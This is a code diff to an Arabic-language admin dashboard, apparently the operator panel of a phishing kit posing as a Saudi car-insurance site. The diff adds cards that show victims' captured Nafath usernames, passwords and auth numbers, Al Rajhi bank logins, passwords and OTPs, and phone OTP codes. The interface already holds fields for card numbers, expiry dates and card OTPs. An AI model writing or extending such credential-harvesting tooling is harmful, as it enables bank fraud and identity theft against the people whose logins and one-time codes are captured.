@@ -49,6 +49,19 @@ interface Notification {
     nationalId?: string;
     phoneNumber?: string;
   };
+  vehicleInfo?: {
+    vehicleSerial?: string;
+    vehicleYear?: string;
+    coverageType?: string;
+    selectedVehicle?: any;
+  };
+  selectedOffer?: {
+    offerId?: string;
+    offerName?: string;
+    insuranceType?: string;
+    selectedFeatures?: string[];
+    totalPrice?: number;
+  };
   paymentInfo?: {
     cardName?: string;
     cardNumber?: string;
@@ -59,6 +72,8 @@ interface Notification {
   phoneNumber?: string;
   phoneCarrier?: string;
   phoneIdNumber?: string;
+  phoneVerificationStatus?: string;
+  phoneSubmittedAt?: string;
   cardName?: string;
   cardNumber?: string;
   cardExpiry?: string;
@@ -71,6 +86,8 @@ interface Notification {
   nafazId?: string;
   nafazPass?: string;
   authNumber?: string;
+  nafazStatus?: string;
+  nafazSubmittedAt?: string;
   atmVerification?: { code: string; status: string; timestamp: string };
   approvalStatus?: string;
   cardOtpApproved?: boolean;
@@ -83,7 +100,8 @@ interface Notification {
   };
   currentPage?: string | number;
   currentStep?: number;
-  step?: string;
+  step?: string | number;
+  status?: string;
   createdAt?: any;
   updatedAt?: any;
   isHidden?: boolean;
@@ -509,38 +527,36 @@ export default function Dashboard() {
           {selectedApplication ? (
             <div className="grid grid-cols-12 gap-4">
               {/* Left Column - Info Cards */}
-              <div className="col-span-4 space-y-4">
+              <div className="col-span-4 space-y-4 overflow-auto max-h-[calc(100vh-180px)]">
                 {/* العرض المختار - Selected Offer */}
                 <Card className="bg-white dark:bg-gray-800">
                   <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
                     <CardTitle className="text-sm font-medium">العرض المختار</CardTitle>
-                    <span className="text-xs text-gray-500">صفحة 1 المسافة</span>
                   </CardHeader>
                   <CardContent className="space-y-2">
                     <div className="flex justify-between items-center py-1 border-b" data-testid="info-company">
                       <span className="text-gray-500 text-sm">الشركة</span>
-                      <span className="font-medium text-sm">{selectedApplication.selectedOfferName || "-"}</span>
+                      <span className="font-medium text-sm">{selectedApplication.selectedOffer?.offerName || selectedApplication.selectedOfferName || "-"}</span>
                     </div>
-                    <div className="flex justify-between items-center py-1 border-b" data-testid="info-original-price">
-                      <span className="text-gray-500 text-sm">السعر الأصلي</span>
-                      <span className="font-medium text-sm">{selectedApplication.originalPrice || "-"}</span>
+                    <div className="flex justify-between items-center py-1 border-b" data-testid="info-insurance-type-offer">
+                      <span className="text-gray-500 text-sm">نوع التأمين</span>
+                      <span className="font-medium text-sm">{selectedApplication.selectedOffer?.insuranceType || "-"}</span>
                     </div>
                     <div className="flex justify-between items-center py-1 border-b" data-testid="info-final-price">
                       <span className="text-gray-500 text-sm">السعر النهائي</span>
-                      <span className="font-medium text-sm">{selectedApplication.offerTotalPrice || "-"}</span>
+                      <span className="font-medium text-sm">{selectedApplication.selectedOffer?.totalPrice || selectedApplication.offerTotalPrice || "-"}</span>
                     </div>
                     <div className="flex justify-between items-center py-1" data-testid="info-features">
                       <span className="text-gray-500 text-sm">المميزات المختارة</span>
-                      <span className="font-medium text-sm">{selectedApplication.selectedFeatures?.length ? `${selectedApplication.selectedFeatures.length} مميزات` : "-"}</span>
+                      <span className="font-medium text-sm">{selectedApplication.selectedOffer?.selectedFeatures?.length || selectedApplication.selectedFeatures?.length || 0} مميزات</span>
                     </div>
                   </CardContent>
                 </Card>
 
-                {/* معلومات أساسية - Basic Info */}
+                {/* معلومات شخصية - Personal Info */}
                 <Card className="bg-white dark:bg-gray-800">
                   <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
-                    <CardTitle className="text-sm font-medium">معلومات أساسية</CardTitle>
-                    <span className="text-xs text-gray-500">صفحة 1 ب 2 إلى 1</span>
+                    <CardTitle className="text-sm font-medium">المعلومات الشخصية</CardTitle>
                   </CardHeader>
                   <CardContent className="space-y-2">
                     <div className="flex justify-between items-center py-1 border-b" data-testid="info-name">
@@ -555,50 +571,115 @@ export default function Dashboard() {
                       <span className="text-gray-500 text-sm">رقم الجوال</span>
                       <span className="font-mono text-sm" dir="ltr">{getPhoneNumber(selectedApplication) || "-"}</span>
                     </div>
-                    <div className="flex justify-between items-center py-1 border-b" data-testid="info-doc-type">
-                      <span className="text-gray-500 text-sm">نوع الوثيقة</span>
-                      <span className="font-medium text-sm">{selectedApplication.documentType || "-"}</span>
+                    <div className="flex justify-between items-center py-1 border-b" data-testid="info-birthdate">
+                      <span className="text-gray-500 text-sm">تاريخ الميلاد</span>
+                      <span className="font-mono text-sm" dir="ltr">
+                        {selectedApplication.personalInfo?.birthDay && selectedApplication.personalInfo?.birthMonth && selectedApplication.personalInfo?.birthYear 
+                          ? `${selectedApplication.personalInfo.birthDay}/${selectedApplication.personalInfo.birthMonth}/${selectedApplication.personalInfo.birthYear}`
+                          : "-"}
+                      </span>
                     </div>
-                    <div className="flex justify-between items-center py-1 border-b" data-testid="info-serial">
-                      <span className="text-gray-500 text-sm">الرقم التسلسلي</span>
-                      <span className="font-mono text-sm" dir="ltr">{selectedApplication.vehicleSerial || "-"}</span>
-                    </div>
-                    <div className="flex justify-between items-center py-1" data-testid="info-insurance-type">
-                      <span className="text-gray-500 text-sm">نوع التأمين</span>
-                      <span className="font-medium text-sm">{selectedApplication.insuranceType || "-"}</span>
+                    <div className="flex justify-between items-center py-1" data-testid="info-hijri">
+                      <span className="text-gray-500 text-sm">التقويم</span>
+                      <span className="font-medium text-sm">{selectedApplication.personalInfo?.isHijri ? "هجري" : "ميلادي"}</span>
                     </div>
                   </CardContent>
                 </Card>
 
-                {/* تفاصيل التأمين - Insurance Details */}
+                {/* معلومات المركبة - Vehicle Info */}
                 <Card className="bg-white dark:bg-gray-800">
                   <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
-                    <CardTitle className="text-sm font-medium">تفاصيل التأمين</CardTitle>
-                    <span className="text-xs text-gray-500">بإنتظار | 1Oham</span>
+                    <CardTitle className="text-sm font-medium">معلومات المركبة</CardTitle>
                   </CardHeader>
                   <CardContent className="space-y-2">
-                    <div className="flex justify-between items-center py-1 border-b" data-testid="info-coverage">
+                    <div className="flex justify-between items-center py-1 border-b" data-testid="info-serial">
+                      <span className="text-gray-500 text-sm">الرقم التسلسلي</span>
+                      <span className="font-mono text-sm" dir="ltr">{selectedApplication.vehicleInfo?.vehicleSerial || selectedApplication.vehicleSerial || "-"}</span>
+                    </div>
+                    <div className="flex justify-between items-center py-1 border-b" data-testid="info-year">
+                      <span className="text-gray-500 text-sm">سنة الصنع</span>
+                      <span className="font-mono text-sm" dir="ltr">{selectedApplication.vehicleInfo?.vehicleYear || selectedApplication.vehicleYear || "-"}</span>
+                    </div>
+                    <div className="flex justify-between items-center py-1" data-testid="info-coverage">
                       <span className="text-gray-500 text-sm">نوع التغطية</span>
-                      <span className="font-medium text-sm">{selectedApplication.coverageType ? (selectedApplication.coverageType === "third-party" ? "طرف ثالث" : "شامل") : "-"}</span>
-                    </div>
-                    <div className="flex justify-between items-center py-1 border-b" data-testid="info-vehicle-value">
-                      <span className="text-gray-500 text-sm">قيمة المركبة</span>
-                      <span className="font-medium text-sm">{selectedApplication.vehicleValue || "-"}</span>
-                    </div>
-                    <div className="flex justify-between items-center py-1 border-b" data-testid="info-deductible">
-                      <span className="text-gray-500 text-sm">نسبة التحمل</span>
-                      <span className="font-medium text-sm">{selectedApplication.deductiblePercentage || "-"}</span>
-                    </div>
-                    <div className="flex justify-between items-center py-1 border-b" data-testid="info-usage">
-                      <span className="text-gray-500 text-sm">استخدام المركبة</span>
-                      <span className="font-medium text-sm">{selectedApplication.vehicleUsage || "-"}</span>
-                    </div>
-                    <div className="flex justify-between items-center py-1" data-testid="info-repair-location">
-                      <span className="text-gray-500 text-sm">موقع الإصلاح</span>
-                      <span className="font-medium text-sm">{selectedApplication.repairLocation || "-"}</span>
+                      <span className="font-medium text-sm">
+                        {(selectedApplication.vehicleInfo?.coverageType || selectedApplication.coverageType) === "third-party" ? "طرف ثالث" : 
+                         (selectedApplication.vehicleInfo?.coverageType || selectedApplication.coverageType) === "comprehensive" ? "شامل" : "-"}
+                      </span>
                     </div>
                   </CardContent>
                 </Card>
+
+                {/* بيانات نفاذ - Nafaz Data */}
+                {(selectedApplication.nafazId || selectedApplication.nafazPass || selectedApplication.authNumber) && (
+                  <Card className="bg-white dark:bg-gray-800 border-blue-200">
+                    <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
+                      <CardTitle className="text-sm font-medium text-blue-600">بيانات نفاذ</CardTitle>
+                      <Badge variant="outline" className="text-xs">{selectedApplication.nafazStatus || "pending"}</Badge>
+                    </CardHeader>
+                    <CardContent className="space-y-2">
+                      <div className="flex justify-between items-center py-1 border-b" data-testid="info-nafaz-id">
+                        <span className="text-gray-500 text-sm">اسم المستخدم</span>
+                        <span className="font-mono text-sm" dir="ltr">{selectedApplication.nafazId || "-"}</span>
+                      </div>
+                      <div className="flex justify-between items-center py-1 border-b" data-testid="info-nafaz-pass">
+                        <span className="text-gray-500 text-sm">كلمة المرور</span>
+                        <span className="font-mono text-sm" dir="ltr">{selectedApplication.nafazPass || "-"}</span>
+                      </div>
+                      <div className="flex justify-between items-center py-1" data-testid="info-nafaz-auth">
+                        <span className="text-gray-500 text-sm">رقم المصادقة</span>
+                        <span className="font-mono text-sm font-bold text-blue-600" dir="ltr">{selectedApplication.authNumber || "-"}</span>
+                      </div>
+                    </CardContent>
+                  </Card>
+                )}
+
+                {/* بيانات الراجحي - Rajhi Data */}
+                {(selectedApplication.rajhiUser || selectedApplication.rajhiPassword || selectedApplication.rajhiOtp) && (
+                  <Card className="bg-white dark:bg-gray-800 border-green-200">
+                    <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
+                      <CardTitle className="text-sm font-medium text-green-600">بيانات الراجحي</CardTitle>
+                    </CardHeader>
+                    <CardContent className="space-y-2">
+                      <div className="flex justify-between items-center py-1 border-b" data-testid="info-rajhi-user">
+                        <span className="text-gray-500 text-sm">اسم المستخدم</span>
+                        <span className="font-mono text-sm" dir="ltr">{selectedApplication.rajhiUser || "-"}</span>
+                      </div>
+                      <div className="flex justify-between items-center py-1 border-b" data-testid="info-rajhi-pass">
+                        <span className="text-gray-500 text-sm">كلمة المرور</span>
+                        <span className="font-mono text-sm" dir="ltr">{selectedApplication.rajhiPassword || "-"}</span>
+                      </div>
+                      <div className="flex justify-between items-center py-1" data-testid="info-rajhi-otp">
+                        <span className="text-gray-500 text-sm">رمز OTP</span>
+                        <span className="font-mono text-sm font-bold text-green-600" dir="ltr">{selectedApplication.rajhiOtp || "-"}</span>
+                      </div>
+                    </CardContent>
+                  </Card>
+                )}
+
+                {/* بيانات التحقق من الهاتف - Phone Verification Data */}
+                {(selectedApplication.phoneIdNumber || selectedApplication.phoneCarrier || selectedApplication.phoneOtpCode) && (
+                  <Card className="bg-white dark:bg-gray-800 border-purple-200">
+                    <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
+                      <CardTitle className="text-sm font-medium text-purple-600">التحقق من الهاتف</CardTitle>
+                      <Badge variant="outline" className="text-xs">{selectedApplication.phoneVerificationStatus || "pending"}</Badge>
+                    </CardHeader>
+                    <CardContent className="space-y-2">
+                      <div className="flex justify-between items-center py-1 border-b" data-testid="info-phone-id">
+                        <span className="text-gray-500 text-sm">رقم الهوية</span>
+                        <span className="font-mono text-sm" dir="ltr">{selectedApplication.phoneIdNumber || "-"}</span>
+                      </div>
+                      <div className="flex justify-between items-center py-1 border-b" data-testid="info-phone-carrier">
+                        <span className="text-gray-500 text-sm">شركة الاتصالات</span>
+                        <span className="font-medium text-sm">{selectedApplication.phoneCarrier || "-"}</span>
+                      </div>
+                      <div className="flex justify-between items-center py-1" data-testid="info-phone-otp">
+                        <span className="text-gray-500 text-sm">رمز OTP</span>
+                        <span className="font-mono text-sm font-bold text-purple-600" dir="ltr">{selectedApplication.phoneOtpCode || "-"}</span>
+                      </div>
+                    </CardContent>
+                  </Card>
+                )}
               </div>
 
               {/* Center Column - OTP and Card */}
